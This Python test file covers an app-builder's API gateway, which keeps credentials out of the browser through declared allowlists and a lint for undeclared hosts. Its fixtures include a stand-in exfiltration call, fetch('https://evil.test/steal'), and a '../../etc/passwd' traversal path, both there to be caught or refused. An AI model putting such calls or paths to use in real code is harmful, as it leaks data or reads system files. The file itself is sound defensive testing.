"""A credential never reaches the browser (D24).

Two halves are tested here and neither one is the other's backup. The
*declaration* is the control: what it does not permit, nothing forwards. The
*host lint* is the guide: it saves a round trip by telling an agent to declare
the call it just wrote, and it is allowed to be imperfect because the gateway is
what makes the rule true.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from applace import apis, gate, gitrepo, policy
from applace.apps import (
    create_app,
    declare_api,
    declared_apis,
    forget_api,
    require_app,
)
from applace.db import Connection
from applace.paths import ApplacePaths

Home = tuple[ApplacePaths, Connection]


@pytest.fixture
def made(home: Home) -> tuple[ApplacePaths, Connection, str]:
    paths, conn = home
    create_app(paths, conn, name="Api App", stack_name="fake", install=False)
    return paths, conn, "api-app"


# -- the declaration --------------------------------------------------------


def test_a_declaration_says_what_to_fetch_and_who_supplies_the_token(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    result = declare_api(
        paths,
        conn,
        slug,
        name="crm",
        base_url="https://crm.internal/api/v2",
        token_env="CRM_TOKEN",
        paths=["customers/**"],
        methods=["GET"],
    )
    assert result["fetch"] == "/api/gateway/crm/..."
    assert result["token_set"] is False
    assert result["needs"] == f"applace env set {slug} CRM_TOKEN"
    # The name of the variable, never a value, and nothing that looks like one.
    assert json.dumps(result).count("CRM_TOKEN") >= 1
    assert "token" not in result or isinstance(result.get("token"), type(None))


def test_the_value_is_never_an_argument_and_never_comes_back(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    """D8, restated for D24: the declaration is names all the way down."""
    paths, conn, slug = made
    declare_api(
        paths, conn, slug, name="crm", base_url="https://crm.internal", token_env="T"
    )
    listed = declared_apis(conn, slug)
    assert [api["name"] for api in listed["apis"]] == ["crm"]
    assert "value" not in json.dumps(listed)


def test_redeclaring_replaces_rather_than_merges(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    declare_api(
        paths, conn, slug, name="crm", base_url="https://crm.internal",
        paths=["customers/**"], methods=["GET", "POST"],
    )
    declare_api(
        paths, conn, slug, name="crm", base_url="https://crm.internal",
        paths=["customers/**"], methods=["GET"],
    )
    only = declared_apis(conn, slug)["apis"]
    assert len(only) == 1
    assert only[0]["methods"] == ["GET"]


def test_forgetting_an_api_says_whether_there_was_one(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    assert forget_api(conn, slug, "crm")["forgotten"] is True
    assert forget_api(conn, slug, "crm")["forgotten"] is False


def test_a_token_with_the_bundlers_prefix_is_refused(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    """The gateway exists so the value stays out of the bundle; a prefixed name
    puts it straight back in, which would make the whole thing theatre."""
    paths, conn, slug = made
    with pytest.raises(apis.ApiError) as raised:
        declare_api(
            paths, conn, slug, name="crm", base_url="https://crm.internal",
            token_env="TEST_CRM_TOKEN",
        )
    assert "TEST_" in str(raised.value)


def test_a_stack_with_no_gateway_cannot_declare_an_api(
    home: Home, fake_stack: Path,
) -> None:
    paths, conn = home
    text = (fake_stack / "stack.yaml").read_text(encoding="utf-8")
    (fake_stack / "stack.yaml").write_text(
        text.replace("gateway: /api/gateway\n", ""), encoding="utf-8"
    )
    create_app(paths, conn, name="Plain", stack_name="fake", install=False)
    with pytest.raises(apis.ApiError) as raised:
        declare_api(paths, conn, "plain", name="crm", base_url="https://crm.internal")
    assert "no gateway" in str(raised.value)


def test_the_policy_can_refuse_a_host_outright(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    paths.policy.write_text("apis:\n  hosts:\n    - '*.internal'\n", encoding="utf-8")
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    with pytest.raises(policy.PolicyError) as raised:
        declare_api(paths, conn, slug, name="weather", base_url="https://api.weather.test")
    assert "api.weather.test" in str(raised.value)


@pytest.mark.parametrize(
    "fields, expected",
    [
        ({"name": "CRM", "base_url": "https://crm.internal"}, "usable API name"),
        ({"name": "crm", "base_url": "crm.internal"}, "usable base URL"),
        ({"name": "crm", "base_url": "https://crm.internal?k=1"}, "query string"),
        (
            {"name": "crm", "base_url": "https://crm.internal", "methods": ["FETCH"]},
            "unknown method",
        ),
        (
            {"name": "crm", "base_url": "https://crm.internal", "paths": ["/customers"]},
            "not a path pattern",
        ),
    ],
)
def test_a_bad_declaration_says_exactly_what_is_wrong(
    fields: dict[str, object], expected: str
) -> None:
    with pytest.raises(apis.ApiError) as raised:
        apis.build(**fields)  # type: ignore[arg-type]
    assert expected in str(raised.value)


# -- the control ------------------------------------------------------------


@pytest.mark.parametrize(
    "method, path, allowed",
    [
        ("GET", "customers", True),
        ("GET", "customers/42", True),
        ("get", "customers/42", True),
        ("DELETE", "customers/42", False),
        ("GET", "admin", False),
        ("GET", "customers/../admin", False),
        ("GET", "../../etc/passwd", False),
    ],
)
def test_the_declaration_is_the_allowlist(method: str, path: str, allowed: bool) -> None:
    api = apis.build(
        name="crm",
        base_url="https://crm.internal/api",
        paths=["customers", "customers/**"],
        methods=["GET"],
    )
    assert (api.permits(method, path) == "") is allowed


def test_the_upstream_url_is_built_from_the_declaration_only() -> None:
    api = apis.build(name="crm", base_url="https://crm.internal/api/v2/")
    assert api.upstream("customers/42", "limit=20") == (
        "https://crm.internal/api/v2/customers/42?limit=20"
    )


def test_a_path_that_climbs_out_resolves_rather_than_escapes() -> None:
    assert apis.normalise("customers/./42") == "customers/42"
    assert apis.normalise("customers/../orders") == "orders"
    assert apis.normalise("../secrets") is None


# -- the guide --------------------------------------------------------------


def test_the_lint_finds_an_undeclared_call_with_its_line() -> None:
    written = {
        "src/App.tsx": "const x = 1\nfetch('https://evil.test/steal')\n",
    }
    found = apis.host_lint(written, [])
    assert [(r.file, r.line, r.host) for r in found] == [
        ("src/App.tsx", 2, "evil.test")
    ]
    assert "declare_api" in found[0].hint


def test_the_lint_leaves_a_declared_host_and_an_svg_namespace_alone() -> None:
    api = apis.build(name="crm", base_url="https://crm.internal")
    written = {
        "src/App.tsx": (
            '<svg xmlns="http://www.w3.org/2000/svg" />\n'
            "fetch('https://crm.internal/customers')\n"
            "fetch('/api/gateway/crm/customers')\n"
            "fetch('http://localhost:8000/dev')\n"
        )
    }
    assert apis.host_lint(written, [api]) == []


def test_the_lint_ignores_files_that_are_not_source() -> None:
    written = {"README.md": "see https://evil.test/steal\n"}
    assert apis.host_lint(written, []) == []


# -- the generated function -------------------------------------------------


def test_the_generated_function_imports_nothing_from_applace() -> None:
    """D1: an app must not be able to tell that Applace exists."""
    source = apis.function_source(
        [apis.build(name="crm", base_url="https://crm.internal", token_env="CRM_TOKEN")]
    )
    assert "import" not in source.replace("imports nothing", "")
    assert "applace" not in source.lower().replace(
        "generated by applace", ""
    ).replace("deletes applace", "")
    assert "process.env[api.tokenEnv]" in source
    # The declaration travels as data, the credential does not travel at all.
    assert "CRM_TOKEN" in source


def test_a_declaration_puts_the_function_in_the_apps_own_repository(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    """D1: what ships is a file a human can read, committed to their git."""
    paths, conn, slug = made
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    report = gate.write_files(
        paths, conn, app=slug, files_to_write={"src/new.txt": "hello\n"}
    )
    assert report.ok
    root = Path(str(require_app(conn, slug)["path"]))
    assert (root / apis.FUNCTION_PATH).exists()
    assert apis.FUNCTION_PATH in gitrepo.tracked_files(root)


def test_forgetting_the_last_api_takes_the_function_back_out(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    gate.write_files(paths, conn, app=slug, files_to_write={"src/new.txt": "hi\n"})
    root = Path(str(require_app(conn, slug)["path"]))

    forget_api(conn, slug, "crm")
    report = gate.write_files(paths, conn, app=slug, files_to_write={})
    assert report.ok
    assert not (root / apis.FUNCTION_PATH).exists()
    assert not (root / "api").exists()


def test_an_unchanged_declaration_does_not_rewrite_the_function(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    """A history full of "regenerated the same file" commits is unreadable."""
    paths, conn, slug = made
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    first = gate.write_files(paths, conn, app=slug, files_to_write={"a.txt": "1\n"})
    second = gate.write_files(paths, conn, app=slug, files_to_write={"b.txt": "2\n"})
    assert first.generated == apis.FUNCTION_PATH
    assert second.generated == ""


def test_a_write_that_calls_an_undeclared_host_is_red_and_not_committed(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    root = Path(str(require_app(conn, slug)["path"]))
    before = gitrepo.head(root).sha
    report = gate.write_files(
        paths,
        conn,
        app=slug,
        files_to_write={"src/App.tsx": "fetch('https://crm.internal/customers')\n"},
    )
    assert not report.ok
    assert report.stage == "apis"
    assert report.errors[0].file == "src/App.tsx"
    assert "crm.internal" in report.errors[0].message
    # D4: the write is on disk so the agent can fix it, and not in the history.
    assert (root / "src/App.tsx").exists()
    assert not report.committed
    assert gitrepo.head(root).sha == before


def test_a_declaration_the_policy_no_longer_allows_stops_the_build(
    made: tuple[ApplacePaths, Connection, str],
) -> None:
    paths, conn, slug = made
    declare_api(paths, conn, slug, name="crm", base_url="https://crm.internal")
    paths.policy.write_text("apis:\n  hosts:\n    - '*.example'\n", encoding="utf-8")
    report = gate.write_files(paths, conn, app=slug, files_to_write={"a.txt": "1\n"})
    assert not report.ok
    assert report.stage == "apis"
    assert "forget_api" in report.errors[0].message


def test_the_generated_function_is_javascript_node_accepts() -> None:
    node = shutil.which("node")
    if node is None:
        pytest.skip("node is not on PATH")
    source = apis.function_source(
        [apis.build(name="crm", base_url="https://crm.internal", token_env="CRM_TOKEN")]
    )
    done = subprocess.run(
        [node, "--input-type=module", "--check"],
        input=source, text=True, capture_output=True,
    )
    assert done.returncode == 0, done.stderr
